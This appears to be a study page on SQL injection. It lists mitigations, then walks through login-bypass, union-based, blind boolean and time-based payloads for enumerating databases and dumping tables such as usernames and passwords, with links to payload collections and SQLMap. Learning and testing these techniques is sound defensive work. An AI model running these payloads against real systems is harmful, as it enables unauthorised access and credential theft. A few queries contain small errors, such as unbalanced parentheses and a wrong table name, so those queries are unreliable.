# SQL injections (SQLi)

<div class="row row-cols-md-2"><div>

Mitigations

* Use **prepared requests** (statements), they are ensuring that the parameters of your queries are not interpreted as SQL code
* **Input validation** or **escaping user input**: You can filter input, but you CAN'T rely on it, as your filter will _most likely_ be bypassed
* **Do not trust anyone** üìå. SQL injections may be delayed. You may do protect your login queries, but if the provided username is some SQL code, then any other request using the username may interpret it, hence you should secure every request, even if there are not handling data from the user, as they may later. You should use an API for better security.
</div><div>

**How we created this payload:**

**Test `'`**: because the value is inside quotes, we need to close it.

```sql
Select name,desc from product where name LIKE '%'%'
```

The problem, is that now the query won't work, because we have a trailing `%'`. So, we comment out the rest of the query with `' --`.

```sql
Select name,desc from product where name LIKE '%' --%'
```

The code above may not work in some DBMS, because they want a space between the start of a comment, and the comment itself. So, we add "` -`", to ensure that there is a space giving us **`'-- -`**.

```sql
Select name,desc from product where name LIKE '%' -- -%'
```

Between `'` and `-- -`, we can write SQL code, through the syntax of the final query must be valid ‚úåÔ∏è. In the example, we used "` UNION Select username,password FROM users`" to merge the results of two queries.
</div></div>

<hr class="sep-both">

## Famous payloads

**Payloads** are the values that you are using to break into the database.

<div class="row row-cols-md-2"><div>

* [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) (2.6k ‚≠ê)
* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) (42.3k ‚≠ê)
</div><div>

* [SQLMap](../sqlmap/index.md) (25k ‚≠ê) - automated tool üìå

</div></div>

<table class="table table-bordered table-striped border-dark mt-3">
<thead>
<tr><th>Name</th><th>SQL</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>Usual PoC</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>'</code><br><small>The query will fail as there would be 3 quotes,<br> and that would confirm that an injection is possible.</small></td></tr>

<tr><td>NoPassword</td><td><code>Select [...] where username='here' AND password='here' [...]</code></td><td><code>' OR 1=1 -- -</code><br><small>The query will bypass the check of the password,<br>if it was made in the query.<br>We use 1=1 for maximum compatibility.</small></td></tr>

<tr><td>Input box String</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>' code -- -</code></td></tr>

<tr><td>Input box Non-String</td><td><code>Select [...] where xxx=here [...]</code></td><td><code>'' code -- -</code></td></tr>

<tr><td>Update</td><td><code>Update [...] set x='here',y=[...]</code></td><td><code>',x=(code),y='</code></td></tr>
</tbody></table>

<div class="row row-cols-md-2 mt-4"><div>

* If there are client-side filters, then intercept the request (ex: Burp)

* If the developer was lazy, the "names" in the form, may be similar, or the name of columns in the database

</div><div>
</div></div>

<hr class="sep-both">

## Manual Union-based SQLi

<div class="row row-cols-md-2"><div>

**Union-based SQLi** can only be achieved if the two queries have the same number of attributes in the SELECT, as per the property of the UNION clause. Hence, we first need to find how many parameters there are in the unknown request. There are 2 ways

<details class="details-n">
<summary><b>error-based</b> using <code>UNION SELECT</code></summary>

```text
UNION SELECT NULL -- fail
UNION SELECT NULL, NULL -- fail
UNION SELECT NULL, NULL, NULL -- fail
UNION SELECT NULL, NULL, NULL, NULL -- OK
```

As the 4 query is successful, we know that there are 4 parameters in the select. Note that NULL is the most used, but you may use any value such as `1`, `2`...
</details>

<details class="details-n">
<summary><b>error-based</b> using <code>ORDER BY</code></summary>

`ORDER BY` can take an index, which is a shortcut for the $nth$ argument in the select. If you use an invalid $n$, then the request fails.

```text
ORDER BY 1 -- fail
ORDER BY 2 -- fail
ORDER BY 3 -- fail
ORDER BY 4 -- OK
```
</details>

The second objective is to find the DBMS, and its version, just to ensure that any following query is valid in the DBMS language. You can fetch the user too with `user()`.

```text
UNION SELECT @@version, NULL, NULL, NULL
UNION SELECT sqlite_version(), NULL, NULL, NULL
UNION SELECT VERSION(), NULL, NULL, NULL
UNION SELECT (SELECT banner FROM v$version), NULL, NULL, NULL
...
```

> Note that there may be an error at this point if the server was expecting the first value of the select to be an "int" (for instance). Simply move the call of `@@version/...`, until it's successful.
</div><div>

**Note**: functions available in MariaDB/MySQL, and PostgresSQL maybe

The third objective is to find the database name.

```text
UNION SELECT database(), NULL, NULL, NULL
```

The fourth objective is to find the tables. Note that the following query will return one result, but if your attack channel allows you to display more than one, then you may remove the `group_concat`.

```text
UNION SELECT group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'
```

Then, you may want to know the columns of a table

```text
UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE TABLE_SCHEMA='database_name' AND TABLE_NAME='table_name'
```

Now, you have everything you need to dump all results.

```text
UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM database_name.table_name
```

<p class="mt-3"><b>Notes for SQLite</b></p>

```text
UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
UNION SELECT group_concat(col1 || ":" || col2, '<br>') [...]
```

</div></div>

<hr class="sep-both">

## Manual Error-based SQLi

<div class="row row-cols-md-2"><div>

You better be prepared, manual error-based SQLi may take QUITE some time, as you may have to iterate a lot of characters. Let's say you found the following GET form to be injectable. If you use "1", you can see a valid account, but if you return "0", you will see "page not found".

```text
GET /account?id=1
```

Then, your starting point will be

```text
GET /account?id=1' AND 1=0-- -
```

Now, even if the id is valid, you will see "page not found". If you use `1=1`, everything should work like before. That's how you will have to play with the request. When you got "page not found", it will mean that your condition failed, and bit-by-bit you will map the database. There are two well-known ways to process

* Using LIKE <small>(work on text AND numbers)</small>

```text
WHERE text LIKE 'a%'
-- is text starting with 'a'
WHERE text LIKE '%0%'
-- do the text contains 0?
```

* Using SUBSTR, and ASCII/CAST

```text
WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
-- extract the first character (pos=1, len=1)
-- of a text 'text'. Convert the character to ASCII
-- and, check if this is the same as the ASCII of 'a'
```

**Why?**: You would (obviously) want to go with LIKE, but it won't always work. For instance, the parameter may be transformed to lowercase/uppercase according to what the programmer wants...

```text
-- find the ASCII (do it inside YOUR DBMS)
SELECT ASCII('A') -- 65

-- then use
WHERE ASCII(SUBSTR(text,1,1) = 65
-- some are using "65 to HEX" = X'41'
WHERE SUBSTR(text,1,1) = CAST(X'41' as char)
```

</div><div>

First, to avoid losing too much motivation, it may be better to test how many characters you are looking for. For instance, for the database name

```text
' AND LENGTH(database()) > 5 -- -
' AND LENGTH(database()) > 15 -- -
' AND LENGTH(database()) > 12 -- -
' AND LENGTH(database()) == 14 -- --
[...]
```

**Examples with LIKE**

Then, you can start. As everything is the same as for **Union-based SQLi**, and the process is the same for every text, I will only show an example of getting the database name.

```text
' AND database() LIKE '%' -- - // test, should always be true
' AND database() LIKE 'a%' -- - // starting
' AND database() LIKE 'b%' -- -
[...]
' AND database() LIKE 'm%' -- - // ok
' AND database() LIKE 'ma%' -- -
' AND database() LIKE 'mb%' -- -
[...]
' AND database() LIKE 'my_example' -- - // found üò¢
```

Sometimes, there may be more than one match. For instance, we could have a database starting with `my_`. In such a case, to know if there are more databases like this, you have to exclude the one you found.

```text
' AND database()!='my_example' AND database() LIKE 'my_%' -- -
```

If the query returns true, you may have one more database to check out. Following here, I'm doing this

```text
-- fetch table name
' 1 IN (SELECT 1 FROM information_schema.tables WHERE table_schema = 'database_name' AND table_name like '%') -- -
[...]
-- fetch column name
' 1 IN (SELECT 1 FROM information_schema.tables WHERE table_schema = 'database_name' AND table_name='table_name' AND column_name LIKE '%') -- -
[...]
-- fetch values
' 1 IN (SELECT 1 FROM database_name.table_name WHERE column_name LIKE '%') -- -
```
</div></div>

<hr class="sep-both">

## Manual Time-based SQLi

<div class="row row-cols-md-2"><div>

This kind of SQLi is quite similar to **Error-based SQLi**, the only difference being that instead of using

```
UNION SELECT NULL
```

We will use

```
UNION SELECT SLEEP(5)
```
</div><div>

The SELECT is only applied on the elements returned after applying the WHERE, if there are none, then the SLEEP function won't be called, and if the hacker didn't have to wait $n$ seconds, it will indicate that the where was false.

For instance, on a login page in which you don't know the credentials, you will most likely don't know if the query failed, there are too many possibilities as to why. But, using time-based SQLi, if the request takes a fixed amount of time, you will be sure of the answer to your question.
</div></div>